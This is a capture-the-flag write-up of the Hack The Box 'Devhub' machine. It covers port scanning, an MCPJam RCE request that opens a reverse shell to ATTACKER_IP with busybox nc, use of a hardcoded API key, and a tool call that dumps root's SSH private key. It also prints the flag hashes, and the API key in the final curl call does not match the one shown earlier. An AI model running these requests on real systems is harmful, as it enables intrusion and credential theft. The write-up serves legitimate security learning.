---
layout: post
title: "Devhub — HTB Writeup"
box_name: Devhub
box_icon: /assets/images/boxes/devhub.png
os: Linux
difficulty: Medium
points: 20
retired: "2026-07-25"
tags: [python, API, tokens, jupyter]
---

>`Devhub` was a medium rated machine but felt more like a `easy` machine as it mainly focused on enumerations skills. It required you to enumerate internal services and utlize API tokens hardcoded in config files.


## Recon

Starting with the basic nmap and looking around

```console
nmap -p- -vvv --min-rate 10000 <MACHINE_IP>
```

| Port  | Service |
| ------------- | ------------- |
| 22  | ssh  |
| 80  | http  |
| 6274  | unknown  |

Http on port `80` tells us there is a website being hosted, after adding the ip to our /etc/hosts file we see:


The webpage hosted on http gives us some information about the platform features. We see that there is a debugging tool on port `6274` which we've seen before and also a internal service on port `8888`.

## Foothold

`MCPJam` is being hosted on that port, we can retrieve the version number `v1.4.2` from the settings page. This version is vulnerable to [RCE](https://github.com/advisories/GHSA-232v-j27c-5pp6).

We can craft and send a request to the endpoint using curl to get a shell:

```console
curl -X POST "http://devhub.htb:6274/api/mcp/connect" -H "Content-Type: application/json" -d '{"serverConfig":{"command":"busybox","args":["nc","ATTACKER_IP","PORT","-e","/bin/bash"],"env":{}},"serverId":"213j1l3jkljkl3j"}'
```

After upgrading the shell we are logged in as mcp-dev:

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

Enumeration reveals another user `analyst` as well as a few ports open.

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ss -tulnp
Netid  State   Recv-Q  Send-Q    Local Address:Port     Peer Address:Port  Process                                      
udp    UNCONN  0       0         127.0.0.53%lo:53            0.0.0.0:*                                                  
udp    UNCONN  0       0               0.0.0.0:68            0.0.0.0:*                                                  
tcp    LISTEN  0       4096      127.0.0.53%lo:53            0.0.0.0:*                                                  
tcp    LISTEN  0       511             0.0.0.0:6274          0.0.0.0:*      users:(("node-MainThread",pid=1290,fd=29))  
tcp    LISTEN  0       128             0.0.0.0:22            0.0.0.0:*                                                  
tcp    LISTEN  0       511             0.0.0.0:80            0.0.0.0:*                                                  
tcp    LISTEN  0       128           127.0.0.1:5000          0.0.0.0:*                                                  
tcp    LISTEN  0       128           127.0.0.1:8888          0.0.0.0:*                                                  
tcp    LISTEN  0       128                [::]:22               [::]:*  
```
## Lateral movement to User
Port `5000` appears to be a OPSMCP server running as root but requires an API key and is owned by the user `analyst`. Port `8888` is hosting a jupyter notebook for the user analyst. Using `chisel` or `ssh` to port forward it back to our machines browser we can access the notebook and use the notebooks built in terminal as `analyst`.


<div class="flag">user.txt captured</div>
```console
cat user.txt
e1bc3c77bafdf46739a1dbd86a11ca31
```

## Root
Going back to port `5000` which is a `analyst` owned program being ran by root, we can view the contents of the `server.py`. The API key is hard coded:

```
# API Key for authentication
VALID_API_KEY = "opsmcp_admin_7f3b9c2d1e4f5a6b"
```

We also can see there's a `ops._admin_dump` function that can dump `ssh_keys`. Since the user that is running the server.py is `root` we can dump it's ssh keys and login as root through ssh.

```
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```
```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

Using the private key we can then ssh as root to the machine and get root.txt

<div class="flag">root.txt captured</div>
```flag
root@devhub:~# cat root.txt
9046c3298be4919e551112642854cbf4
```
